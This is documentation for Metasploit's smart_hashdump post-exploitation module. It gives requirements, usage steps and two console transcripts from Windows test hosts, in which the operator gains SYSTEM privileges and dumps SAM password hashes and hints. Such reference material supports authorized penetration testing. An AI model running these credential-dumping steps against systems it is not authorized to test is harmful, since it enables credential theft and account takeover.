## Vulnerable Application
The post/windows/gather/smart_hashdump module dumps local accounts from the SAM database. If the target host
is a Domain Controller, it will dump the Domain Account Database using the proper technique depending
on privilege level, OS and role of the host.

Hashes will be saved to the Metasploit database in John the Ripper format for later use.

To be able to use post/windows/gather/smart_hashdump, you must meet these requirements:

* You are on a Meterpreter type session.
* The target is a Windows platform.
* It must be executed under the context of a high privilege account, such as SYSTEM.

## Verification Steps

1. Obtain a meterpreter shell on a Windows system, and ensure that you have SYSTEM privileges
   or are running as a highly privileged user.
1. `use post/windows/gather/smart_hashdump`
1. Specify the session, eg: `set SESSION 1`
1. If necessary, tell the module to attempt to elevate to SYSTEM before
   attempting to dump the credentials with the command: `set GETSYSTEM true`.
1. Run the module.

## Options

### GETSYSTEM
Attempt to run the `getsystem` module on the target host to get `NT AUTHORITY\SYSTEM` privileges prior to dumping the hashes.

## Scenarios

**High Privilege Account on Windows 10 x64 v2004**

Before using post/windows/gather/smart_hashdump, there is a possibility you need to escalate your privileges.
This module features a `GETSYSTEM` option, which will attempt to elevate from a high privileged account to `NT AUTHORITY\SYSTEM`.
This can be seen in the following example which is running as a high privileged user in which the module
fails to run successfully as the current user is not `NT AUTHORITY\SYSTEM`. By using the `GETSYSTEM` option, the user is able
to elevate themselves to `NT AUTHORITY\SYSTEM` using Metasploit's `getsystem` module, after which they are then able
to dump the password hashes.

```
msf6 exploit(multi/handler) > use post/windows/gather/smart_hashdump
msf6 post(windows/gather/smart_hashdump) > show options

Module options (post/windows/gather/smart_hashdump):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   GETSYSTEM  false            no        Attempt to get SYSTEM privilege on the target host.
   SESSION                     yes       The session to run this module on.

msf6 post(windows/gather/smart_hashdump) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/smart_hashdump) > run

[*] Running module against DESKTOP-G7A2R2R
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /home/kali/.msf4/loot/20201008121933_default_192.168.56.117_windows.hashes_338495.txt
[-] Insufficient privileges to dump hashes!
[*] Post module execution completed
msf6 post(windows/gather/smart_hashdump) > set GETSYSTEM true
GETSYSTEM => true
msf6 post(windows/gather/smart_hashdump) > run

[*] Running module against DESKTOP-G7A2R2R
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /home/kali/.msf4/loot/20201008122008_default_192.168.56.117_windows.hashes_353942.txt
[*] Dumping password hashes...
[*] Trying to get SYSTEM privilege
[+] Got SYSTEM privilege
[*]     Obtaining the boot key...
[*]     Calculating the hboot key using SYSKEY 4934844cf0365459683ed18d9ebcb903...
[*]     Obtaining the user list and keys...
[*]     Decrypting user keys...
[*]     Dumping password hints...
[*]     No users with password hints on this system
[*]     Dumping password hashes...
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Post module execution completed
```

**Running as the SYSTEM user on Windows 7 x64 SP1**
```
msf6 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 172.24.15.185:4444
[*] Sending stage (200262 bytes) to 172.24.15.185
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.24.15.185:4444) at 2020-10-08 12:46:47 -0500

meterpreter > getuid
Server username: test-PC\test
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/windows/gather/smart_hashdump
msf6 post(windows/gather/smart_hashdump) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : TEST-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > background
[*] Backgrounding session 1...
msf6 post(windows/gather/smart_hashdump) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/smart_hashdump) > run

[*] Running module against TEST-PC
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /home/gwillcox/.msf4/loot/20201008124735_default_172.24.15.185_windows.hashes_456389.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*] 	Obtaining the boot key...
[*] 	Calculating the hboot key using SYSKEY 8e9f8fa11359f037112782911694d611...
[*] 	Obtaining the user list and keys...
[*] 	Decrypting user keys...
[*] 	Dumping password hints...
[+] 	test:"a"
[+] 	test2:"asdf"
[*] 	Dumping password hashes...
[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] 	test:1000:aad3b435b51404eeaad3b435b51404ee:0cb6948805f797bf2a82807973b89537:::
[+] 	test2:1001:aad3b435b51404eeaad3b435b51404ee:0e8231621f574d3636255ff36dd86c9c:::
[*] Post module execution completed
msf6 post(windows/gather/smart_hashdump) >
```
